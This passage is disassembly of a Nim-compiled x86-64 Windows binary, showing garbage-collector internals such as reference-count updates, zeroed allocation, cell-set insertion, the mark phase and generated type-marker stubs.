  402ea9:	e8 f2 ed ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  402eae:	48 89 da             	mov    %rbx,%rdx
  402eb1:	48 8d 48 50          	lea    0x50(%rax),%rcx
  402eb5:	48 83 c4 20          	add    $0x20,%rsp
  402eb9:	5b                   	pop    %rbx
  402eba:	eb c1                	jmp    402e7d <addZCT__Y66tOYFjgwJ0k4aLz4bc0Q>
  402ebc:	48 83 c4 20          	add    $0x20,%rsp
  402ec0:	5b                   	pop    %rbx
  402ec1:	c3                   	ret

0000000000402ec2 <unsureAsgnRef>:
  402ec2:	56                   	push   %rsi
  402ec3:	53                   	push   %rbx
  402ec4:	48 83 ec 28          	sub    $0x28,%rsp
  402ec8:	48 89 ce             	mov    %rcx,%rsi
  402ecb:	48 89 d3             	mov    %rdx,%rbx
  402ece:	e8 2e ee ff ff       	call   401d01 <isOnStack__plOlFsQAAvcYd3nF5LfWzw>
  402ed3:	84 c0                	test   %al,%al
  402ed5:	75 1f                	jne    402ef6 <unsureAsgnRef+0x34>
  402ed7:	48 85 db             	test   %rbx,%rbx
  402eda:	74 05                	je     402ee1 <unsureAsgnRef+0x1f>
  402edc:	48 83 43 f0 08       	addq   $0x8,-0x10(%rbx)
  402ee1:	48 8b 0e             	mov    (%rsi),%rcx
  402ee4:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
  402eeb:	76 09                	jbe    402ef6 <unsureAsgnRef+0x34>
  402eed:	48 83 e9 10          	sub    $0x10,%rcx
  402ef1:	e8 9b ff ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>
  402ef6:	48 89 1e             	mov    %rbx,(%rsi)
  402ef9:	48 83 c4 28          	add    $0x28,%rsp
  402efd:	5b                   	pop    %rbx
  402efe:	5e                   	pop    %rsi
  402eff:	c3                   	ret

0000000000402f00 <asgnRef.lto_priv.65>:
  402f00:	56                   	push   %rsi
  402f01:	53                   	push   %rbx
  402f02:	48 83 ec 28          	sub    $0x28,%rsp
  402f06:	48 85 d2             	test   %rdx,%rdx
  402f09:	48 89 ce             	mov    %rcx,%rsi
  402f0c:	48 89 d3             	mov    %rdx,%rbx
  402f0f:	74 05                	je     402f16 <asgnRef.lto_priv.65+0x16>
  402f11:	48 83 42 f0 08       	addq   $0x8,-0x10(%rdx)
  402f16:	48 8b 0e             	mov    (%rsi),%rcx
  402f19:	48 85 c9             	test   %rcx,%rcx
  402f1c:	74 09                	je     402f27 <asgnRef.lto_priv.65+0x27>
  402f1e:	48 83 e9 10          	sub    $0x10,%rcx
  402f22:	e8 6a ff ff ff       	call   402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>
  402f27:	48 89 1e             	mov    %rbx,(%rsi)
  402f2a:	48 83 c4 28          	add    $0x28,%rsp
  402f2e:	5b                   	pop    %rbx
  402f2f:	5e                   	pop    %rsi
  402f30:	c3                   	ret

0000000000402f31 <nimGCunrefNoCycle.lto_priv.80>:
  402f31:	48 83 e9 10          	sub    $0x10,%rcx
  402f35:	e9 57 ff ff ff       	jmp    402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>

0000000000402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>:
  402f3a:	53                   	push   %rbx
  402f3b:	48 83 ec 30          	sub    $0x30,%rsp
  402f3f:	48 89 d3             	mov    %rdx,%rbx
  402f42:	e8 df fb ff ff       	call   402b26 <alloc__UxtcZ3QOXKsB7mMchxUf9cg_2>
  402f47:	48 89 da             	mov    %rbx,%rdx
  402f4a:	48 89 c1             	mov    %rax,%rcx
  402f4d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402f52:	e8 6b ea ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  402f57:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  402f5c:	48 83 c4 30          	add    $0x30,%rsp
  402f60:	5b                   	pop    %rbx
  402f61:	c3                   	ret

0000000000402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>:
  402f62:	53                   	push   %rbx
  402f63:	48 83 ec 20          	sub    $0x20,%rsp
  402f67:	48 89 cb             	mov    %rcx,%rbx
  402f6a:	e8 31 ed ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  402f6f:	48 89 da             	mov    %rbx,%rdx
  402f72:	48 8d 88 a0 00 00 00 	lea    0xa0(%rax),%rcx
  402f79:	48 83 c4 20          	add    $0x20,%rsp
  402f7d:	5b                   	pop    %rbx
  402f7e:	eb ba                	jmp    402f3a <alloc0__UxtcZ3QOXKsB7mMchxUf9cg>

0000000000402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>:
  402f80:	41 54                	push   %r12
  402f82:	55                   	push   %rbp
  402f83:	57                   	push   %rdi
  402f84:	56                   	push   %rsi
  402f85:	53                   	push   %rbx
  402f86:	48 83 ec 20          	sub    $0x20,%rsp
  402f8a:	48 8b 69 08          	mov    0x8(%rcx),%rbp
  402f8e:	48 89 cb             	mov    %rcx,%rbx
  402f91:	48 8b 49 18          	mov    0x18(%rcx),%rcx
  402f95:	48 89 d7             	mov    %rdx,%rdi
  402f98:	48 89 d6             	mov    %rdx,%rsi
  402f9b:	48 c1 ef 0c          	shr    $0xc,%rdi
  402f9f:	48 89 ea             	mov    %rbp,%rdx
  402fa2:	48 21 fa             	and    %rdi,%rdx
  402fa5:	48 8b 04 d1          	mov    (%rcx,%rdx,8),%rax
  402fa9:	48 85 c0             	test   %rax,%rax
  402fac:	74 16                	je     402fc4 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x44>
  402fae:	48 3b 78 08          	cmp    0x8(%rax),%rdi
  402fb2:	0f 84 d9 00 00 00    	je     403091 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x111>
  402fb8:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  402fbc:	48 ff c2             	inc    %rdx
  402fbf:	48 21 ea             	and    %rbp,%rdx
  402fc2:	eb e1                	jmp    402fa5 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x25>
  402fc4:	48 8b 13             	mov    (%rbx),%rdx
  402fc7:	48 8d 4d 01          	lea    0x1(%rbp),%rcx
  402fcb:	48 8d 04 09          	lea    (%rcx,%rcx,1),%rax
  402fcf:	4c 8d 04 52          	lea    (%rdx,%rdx,2),%r8
  402fd3:	4c 39 c0             	cmp    %r8,%rax
  402fd6:	7c 0c                	jl     402fe4 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x64>
  402fd8:	49 89 cb             	mov    %rcx,%r11
  402fdb:	49 29 d3             	sub    %rdx,%r11
  402fde:	49 83 fb 03          	cmp    $0x3,%r11
  402fe2:	7f 5e                	jg     403042 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xc2>
  402fe4:	48 ff c8             	dec    %rax
  402fe7:	48 c1 e1 04          	shl    $0x4,%rcx
  402feb:	48 89 43 08          	mov    %rax,0x8(%rbx)
  402fef:	e8 6e ff ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  402ff4:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  402ff8:	45 31 c0             	xor    %r8d,%r8d
  402ffb:	49 89 c4             	mov    %rax,%r12
  402ffe:	4c 39 c5             	cmp    %r8,%rbp
  403001:	7d 0b                	jge    40300e <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x8e>
  403003:	e8 9e f5 ff ff       	call   4025a6 <deallocImpl__lmwgHsdhTsrQaepFju8wew>
  403008:	4c 89 63 18          	mov    %r12,0x18(%rbx)
  40300c:	eb 34                	jmp    403042 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xc2>
  40300e:	4e 8b 0c c1          	mov    (%rcx,%r8,8),%r9
  403012:	4d 85 c9             	test   %r9,%r9
  403015:	74 26                	je     40303d <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xbd>
  403017:	48 8b 43 08          	mov    0x8(%rbx),%rax
  40301b:	49 8b 51 08          	mov    0x8(%r9),%rdx
  40301f:	48 21 c2             	and    %rax,%rdx
  403022:	4d 8d 14 d4          	lea    (%r12,%rdx,8),%r10
  403026:	49 83 3a 00          	cmpq   $0x0,(%r10)
  40302a:	75 05                	jne    403031 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xb1>
  40302c:	4d 89 0a             	mov    %r9,(%r10)
  40302f:	eb 0c                	jmp    40303d <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xbd>
  403031:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
  403035:	48 ff c2             	inc    %rdx
  403038:	48 21 c2             	and    %rax,%rdx
  40303b:	eb e5                	jmp    403022 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xa2>
  40303d:	49 ff c0             	inc    %r8
  403040:	eb bc                	jmp    402ffe <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x7e>
  403042:	48 8b 53 08          	mov    0x8(%rbx),%rdx
  403046:	48 89 f8             	mov    %rdi,%rax
  403049:	48 ff 03             	incq   (%rbx)
  40304c:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  403050:	48 21 d0             	and    %rdx,%rax
  403053:	48 83 3c c1 00       	cmpq   $0x0,(%rcx,%rax,8)
  403058:	48 8d 2c c5 00 00 00 	lea    0x0(,%rax,8),%rbp
  40305f:	00 
  403060:	75 23                	jne    403085 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x105>
  403062:	b9 50 00 00 00       	mov    $0x50,%ecx
  403067:	e8 f6 fe ff ff       	call   402f62 <alloc0Impl__WrVG9abV9chlTLqkiXYLKwUg>
  40306c:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  403070:	48 89 78 08          	mov    %rdi,0x8(%rax)
  403074:	48 89 10             	mov    %rdx,(%rax)
  403077:	48 8b 53 18          	mov    0x18(%rbx),%rdx
  40307b:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40307f:	48 89 04 2a          	mov    %rax,(%rdx,%rbp,1)
  403083:	eb 0c                	jmp    403091 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0x111>
  403085:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  403089:	48 ff c0             	inc    %rax
  40308c:	48 21 d0             	and    %rdx,%rax
  40308f:	eb c2                	jmp    403053 <incl__azHo9bY5qs9b2EZ9cSse4fmZA+0xd3>
  403091:	48 c1 ee 03          	shr    $0x3,%rsi
  403095:	ba 01 00 00 00       	mov    $0x1,%edx
  40309a:	48 89 f1             	mov    %rsi,%rcx
  40309d:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  4030a3:	49 89 c8             	mov    %rcx,%r8
  4030a6:	48 d3 e2             	shl    %cl,%rdx
  4030a9:	49 c1 e8 06          	shr    $0x6,%r8
  4030ad:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  4030b2:	48 83 c4 20          	add    $0x20,%rsp
  4030b6:	5b                   	pop    %rbx
  4030b7:	5e                   	pop    %rsi
  4030b8:	5f                   	pop    %rdi
  4030b9:	5d                   	pop    %rbp
  4030ba:	41 5c                	pop    %r12
  4030bc:	c3                   	ret

00000000004030bd <markS__SOJE9bROCOc8iabVsKM64Sg>:
  4030bd:	55                   	push   %rbp
  4030be:	57                   	push   %rdi
  4030bf:	56                   	push   %rsi
  4030c0:	53                   	push   %rbx
  4030c1:	48 83 ec 28          	sub    $0x28,%rsp
  4030c5:	bd 01 00 00 00       	mov    $0x1,%ebp
  4030ca:	48 8d b9 90 33 00 00 	lea    0x3390(%rcx),%rdi
  4030d1:	48 89 d3             	mov    %rdx,%rbx
  4030d4:	48 89 ce             	mov    %rcx,%rsi
  4030d7:	48 89 f9             	mov    %rdi,%rcx
  4030da:	e8 a1 fe ff ff       	call   402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>
  4030df:	ba 01 00 00 00       	mov    $0x1,%edx
  4030e4:	48 89 d9             	mov    %rbx,%rcx
  4030e7:	e8 ed 05 00 00       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  4030ec:	48 8b 46 48          	mov    0x48(%rsi),%rax
  4030f0:	48 85 c0             	test   %rax,%rax
  4030f3:	7e 6d                	jle    403162 <markS__SOJE9bROCOc8iabVsKM64Sg+0xa5>
  4030f5:	48 8b 56 58          	mov    0x58(%rsi),%rdx
  4030f9:	48 ff c8             	dec    %rax
  4030fc:	48 89 f9             	mov    %rdi,%rcx
  4030ff:	48 89 46 48          	mov    %rax,0x48(%rsi)
  403103:	48 8b 1c c2          	mov    (%rdx,%rax,8),%rbx
  403107:	48 89 da             	mov    %rbx,%rdx
  40310a:	48 c1 ea 0c          	shr    $0xc,%rdx
  40310e:	e8 1f e5 ff ff       	call   401632 <cellSetGet__ld9aj9akVqWcvwRCEMEk1MnQ>
  403113:	48 85 c0             	test   %rax,%rax
  403116:	75 0d                	jne    403125 <markS__SOJE9bROCOc8iabVsKM64Sg+0x68>
  403118:	48 89 da             	mov    %rbx,%rdx
  40311b:	48 89 f9             	mov    %rdi,%rcx
  40311e:	e8 5d fe ff ff       	call   402f80 <incl__azHo9bY5qs9b2EZ9cSse4fmZA>
  403123:	eb 2e                	jmp    403153 <markS__SOJE9bROCOc8iabVsKM64Sg+0x96>
  403125:	48 89 d9             	mov    %rbx,%rcx
  403128:	49 89 e9             	mov    %rbp,%r9
  40312b:	48 c1 e9 03          	shr    $0x3,%rcx
  40312f:	81 e1 ff 01 00 00    	and    $0x1ff,%ecx
  403135:	48 89 ca             	mov    %rcx,%rdx
  403138:	49 d3 e1             	shl    %cl,%r9
  40313b:	48 c1 ea 06          	shr    $0x6,%rdx
  40313f:	48 83 c2 02          	add    $0x2,%rdx
  403143:	4c 8b 04 d0          	mov    (%rax,%rdx,8),%r8
  403147:	4d 85 c8             	test   %r9,%r8
  40314a:	75 a0                	jne    4030ec <markS__SOJE9bROCOc8iabVsKM64Sg+0x2f>
  40314c:	4d 09 c8             	or     %r9,%r8
  40314f:	4c 89 04 d0          	mov    %r8,(%rax,%rdx,8)
  403153:	ba 01 00 00 00       	mov    $0x1,%edx
  403158:	48 89 d9             	mov    %rbx,%rcx
  40315b:	e8 79 05 00 00       	call   4036d9 <forAllChildren__XCvXrotwhq0gugZtuZTNPQ>
  403160:	eb 8a                	jmp    4030ec <markS__SOJE9bROCOc8iabVsKM64Sg+0x2f>
  403162:	48 83 c4 28          	add    $0x28,%rsp
  403166:	5b                   	pop    %rbx
  403167:	5e                   	pop    %rsi
  403168:	5f                   	pop    %rdi
  403169:	5d                   	pop    %rbp
  40316a:	c3                   	ret

000000000040316b <doOperation__sl6eqhLncFedgwzv6TlMVw>:
  40316b:	56                   	push   %rsi
  40316c:	53                   	push   %rbx
  40316d:	48 83 ec 28          	sub    $0x28,%rsp
  403171:	48 89 cb             	mov    %rcx,%rbx
  403174:	89 d6                	mov    %edx,%esi
  403176:	e8 25 eb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  40317b:	48 85 db             	test   %rbx,%rbx
  40317e:	74 4c                	je     4031cc <doOperation__sl6eqhLncFedgwzv6TlMVw+0x61>
  403180:	48 8d 53 f0          	lea    -0x10(%rbx),%rdx
  403184:	40 80 fe 01          	cmp    $0x1,%sil
  403188:	74 30                	je     4031ba <doOperation__sl6eqhLncFedgwzv6TlMVw+0x4f>
  40318a:	40 84 f6             	test   %sil,%sil
  40318d:	74 1c                	je     4031ab <doOperation__sl6eqhLncFedgwzv6TlMVw+0x40>
  40318f:	40 80 fe 02          	cmp    $0x2,%sil
  403193:	74 08                	je     40319d <doOperation__sl6eqhLncFedgwzv6TlMVw+0x32>
  403195:	40 80 fe 03          	cmp    $0x3,%sil
  403199:	74 1f                	je     4031ba <doOperation__sl6eqhLncFedgwzv6TlMVw+0x4f>
  40319b:	eb 2f                	jmp    4031cc <doOperation__sl6eqhLncFedgwzv6TlMVw+0x61>
  40319d:	48 89 d1             	mov    %rdx,%rcx
  4031a0:	48 83 c4 28          	add    $0x28,%rsp
  4031a4:	5b                   	pop    %rbx
  4031a5:	5e                   	pop    %rsi
  4031a6:	e9 e6 fc ff ff       	jmp    402e91 <decRef__AT1eRuflKWyTTBdLjEDZbgsystem.lto_priv.83>
  4031ab:	48 8d 48 38          	lea    0x38(%rax),%rcx
  4031af:	48 83 c4 28          	add    $0x28,%rsp
  4031b3:	5b                   	pop    %rbx
  4031b4:	5e                   	pop    %rsi
  4031b5:	e9 03 ff ff ff       	jmp    4030bd <markS__SOJE9bROCOc8iabVsKM64Sg>
  4031ba:	48 8d 88 80 00 00 00 	lea    0x80(%rax),%rcx
  4031c1:	48 83 c4 28          	add    $0x28,%rsp
  4031c5:	5b                   	pop    %rbx
  4031c6:	5e                   	pop    %rsi
  4031c7:	e9 78 f9 ff ff       	jmp    402b44 <add__W9aRfhn7HvnQTPAb8ajo1uwsystem>
  4031cc:	48 83 c4 28          	add    $0x28,%rsp
  4031d0:	5b                   	pop    %rbx
  4031d1:	5e                   	pop    %rsi
  4031d2:	c3                   	ret

00000000004031d3 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_3>:
  4031d3:	48 83 ec 28          	sub    $0x28,%rsp
  4031d7:	e8 c4 ea ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4031dc:	31 d2                	xor    %edx,%edx
  4031de:	48 8b 48 08          	mov    0x8(%rax),%rcx
  4031e2:	48 83 c4 28          	add    $0x28,%rsp
  4031e6:	eb 83                	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004031e8 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_6>:
  4031e8:	48 83 ec 28          	sub    $0x28,%rsp
  4031ec:	e8 af ea ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  4031f1:	31 d2                	xor    %edx,%edx
  4031f3:	48 8b 48 28          	mov    0x28(%rax),%rcx
  4031f7:	48 83 c4 28          	add    $0x28,%rsp
  4031fb:	e9 6b ff ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403200 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg>:
  403200:	57                   	push   %rdi
  403201:	56                   	push   %rsi
  403202:	53                   	push   %rbx
  403203:	48 83 ec 20          	sub    $0x20,%rsp
  403207:	31 db                	xor    %ebx,%ebx
  403209:	48 89 ce             	mov    %rcx,%rsi
  40320c:	0f b6 fa             	movzbl %dl,%edi
  40320f:	48 85 f6             	test   %rsi,%rsi
  403212:	74 1d                	je     403231 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0x31>
  403214:	48 3b 1e             	cmp    (%rsi),%rbx
  403217:	7d 18                	jge    403231 <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0x31>
  403219:	48 89 d8             	mov    %rbx,%rax
  40321c:	89 fa                	mov    %edi,%edx
  40321e:	48 ff c3             	inc    %rbx
  403221:	48 c1 e0 04          	shl    $0x4,%rax
  403225:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  40322a:	e8 3c ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40322f:	eb de                	jmp    40320f <Marker_tySequence__WF89a8QyKeDCh4DYWTmSiBg+0xf>
  403231:	48 83 c4 20          	add    $0x20,%rsp
  403235:	5b                   	pop    %rbx
  403236:	5e                   	pop    %rsi
  403237:	5f                   	pop    %rdi
  403238:	c3                   	ret

0000000000403239 <Marker_tyRef__vU9aO9cTqOMn6CBzhV8rX7Sw>:
  403239:	56                   	push   %rsi
  40323a:	53                   	push   %rbx
  40323b:	48 83 ec 28          	sub    $0x28,%rsp
  40323f:	48 89 ce             	mov    %rcx,%rsi
  403242:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403246:	0f b6 da             	movzbl %dl,%ebx
  403249:	89 da                	mov    %ebx,%edx
  40324b:	e8 1b ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403250:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403254:	89 da                	mov    %ebx,%edx
  403256:	e8 10 ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40325b:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40325f:	89 da                	mov    %ebx,%edx
  403261:	e8 05 ff ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403266:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  40326a:	89 da                	mov    %ebx,%edx
  40326c:	48 83 c4 28          	add    $0x28,%rsp
  403270:	5b                   	pop    %rbx
  403271:	5e                   	pop    %rsi
  403272:	e9 f4 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403277 <Marker_tyRef__9clYsYwyjCqe2PFTuCI3Ubg>:
  403277:	56                   	push   %rsi
  403278:	53                   	push   %rbx
  403279:	48 83 ec 28          	sub    $0x28,%rsp
  40327d:	48 89 ce             	mov    %rcx,%rsi
  403280:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403284:	0f b6 da             	movzbl %dl,%ebx
  403287:	89 da                	mov    %ebx,%edx
  403289:	e8 dd fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40328e:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403292:	89 da                	mov    %ebx,%edx
  403294:	e8 d2 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403299:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40329d:	89 da                	mov    %ebx,%edx
  40329f:	e8 c7 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032a4:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4032a8:	89 da                	mov    %ebx,%edx
  4032aa:	48 83 c4 28          	add    $0x28,%rsp
  4032ae:	5b                   	pop    %rbx
  4032af:	5e                   	pop    %rsi
  4032b0:	e9 b6 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>:
  4032b5:	56                   	push   %rsi
  4032b6:	53                   	push   %rbx
  4032b7:	48 83 ec 28          	sub    $0x28,%rsp
  4032bb:	48 89 ce             	mov    %rcx,%rsi
  4032be:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  4032c2:	0f b6 da             	movzbl %dl,%ebx
  4032c5:	89 da                	mov    %ebx,%edx
  4032c7:	e8 9f fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032cc:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4032d0:	89 da                	mov    %ebx,%edx
  4032d2:	e8 94 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032d7:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  4032db:	89 da                	mov    %ebx,%edx
  4032dd:	e8 89 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4032e2:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4032e6:	89 da                	mov    %ebx,%edx
  4032e8:	48 83 c4 28          	add    $0x28,%rsp
  4032ec:	5b                   	pop    %rbx
  4032ed:	5e                   	pop    %rsi
  4032ee:	e9 78 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004032f3 <Marker_tyRef__Pjt0MQjoA6TAHAHOFNel9cg>:
  4032f3:	eb c0                	jmp    4032b5 <Marker_tyRef__8SzoIAgLw9ci2v0yafHj9b6Q>

00000000004032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>:
  4032f5:	56                   	push   %rsi
  4032f6:	53                   	push   %rbx
  4032f7:	48 83 ec 28          	sub    $0x28,%rsp
  4032fb:	48 89 ce             	mov    %rcx,%rsi
  4032fe:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  403302:	0f b6 da             	movzbl %dl,%ebx
  403305:	89 da                	mov    %ebx,%edx
  403307:	e8 5f fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  40330c:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  403310:	89 da                	mov    %ebx,%edx
  403312:	e8 54 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403317:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
  40331b:	89 da                	mov    %ebx,%edx
  40331d:	e8 49 fe ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403322:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  403326:	89 da                	mov    %ebx,%edx
  403328:	48 83 c4 28          	add    $0x28,%rsp
  40332c:	5b                   	pop    %rbx
  40332d:	5e                   	pop    %rsi
  40332e:	e9 38 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403333 <Marker_tyRef__DsOOBcxCUeVlNUDRmn9afcA>:
  403333:	eb c0                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403335 <Marker_tyRef__M8bPR1OE5OXPYGyQdVHfTg>:
  403335:	eb be                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403337 <Marker_tyRef__A79aQ4kopJRWUJmF9aQu6afA>:
  403337:	eb bc                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

0000000000403339 <Marker_tyRef__Ie1m0dv1ZHg72IgPRr1cDw>:
  403339:	eb ba                	jmp    4032f5 <Marker_tyRef__HMIVdYjdZYWskTmTQVo5BQ>

000000000040333b <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_2>:
  40333b:	48 8b 0d 16 1d 02 00 	mov    0x21d16(%rip),%rcx        # 425058 <base64Ss__oiZt3HUh4E3gRrnK1to7IQ>
  403342:	31 d2                	xor    %edx,%edx
  403344:	e9 22 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403349 <TM__LJ9cWUOIKdJkv7vFbyFx9a6g_3>:
  403349:	48 8b 0d e8 1c 02 00 	mov    0x21ce8(%rip),%rcx        # 425038 <channel__N5eXcSZk9cFx3Xyn4EpWNYw+0x8>
  403350:	31 d2                	xor    %edx,%edx
  403352:	e9 14 fe ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403357 <TM__gfe9a52b5gJr8GSrnr883iA_5>:
  403357:	48 83 ec 28          	sub    $0x28,%rsp
  40335b:	e8 40 e9 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  403360:	31 d2                	xor    %edx,%edx
  403362:	48 8b 88 80 34 00 00 	mov    0x3480(%rax),%rcx
  403369:	48 83 c4 28          	add    $0x28,%rsp
  40336d:	e9 f9 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

0000000000403372 <Marker_tyRef__OGnyBMU9csFmaJm9bh2uOQiQ>:
  403372:	56                   	push   %rsi
  403373:	53                   	push   %rbx
  403374:	48 83 ec 28          	sub    $0x28,%rsp
  403378:	48 89 ce             	mov    %rcx,%rsi
  40337b:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40337f:	0f b6 da             	movzbl %dl,%ebx
  403382:	89 da                	mov    %ebx,%edx
  403384:	e8 e2 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403389:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  40338d:	89 da                	mov    %ebx,%edx
  40338f:	e8 d7 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  403394:	48 8b 4e 40          	mov    0x40(%rsi),%rcx
  403398:	89 da                	mov    %ebx,%edx
  40339a:	48 83 c4 28          	add    $0x28,%rsp
  40339e:	5b                   	pop    %rbx
  40339f:	5e                   	pop    %rsi
  4033a0:	e9 c6 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004033a5 <Marker_tyRef__TjokxNjmnZmr9bygVDVC9bvg>:
  4033a5:	56                   	push   %rsi
  4033a6:	53                   	push   %rbx
  4033a7:	48 83 ec 28          	sub    $0x28,%rsp
  4033ab:	48 89 ce             	mov    %rcx,%rsi
  4033ae:	48 8b 49 10          	mov    0x10(%rcx),%rcx
  4033b2:	0f b6 da             	movzbl %dl,%ebx
  4033b5:	89 da                	mov    %ebx,%edx
  4033b7:	e8 af fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033bc:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  4033c0:	89 da                	mov    %ebx,%edx
  4033c2:	e8 a4 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033c7:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  4033cb:	89 da                	mov    %ebx,%edx
  4033cd:	e8 99 fd ff ff       	call   40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>
  4033d2:	48 8b 4e 30          	mov    0x30(%rsi),%rcx
  4033d6:	89 da                	mov    %ebx,%edx
  4033d8:	48 83 c4 28          	add    $0x28,%rsp
  4033dc:	5b                   	pop    %rbx
  4033dd:	5e                   	pop    %rsi
  4033de:	e9 88 fd ff ff       	jmp    40316b <doOperation__sl6eqhLncFedgwzv6TlMVw>

00000000004033e3 <Marker_tyRef__gcUT3qWwCET3KjsqW7m5vQ>:
  4033e3:	56                   	push   %rsi
  4033e4:	53                   	push   %rbx
  4033e5:	48 83 ec 28          	sub    $0x28,%rsp
  4033e9:	48 89 ce             	mov    %rcx,%rsi
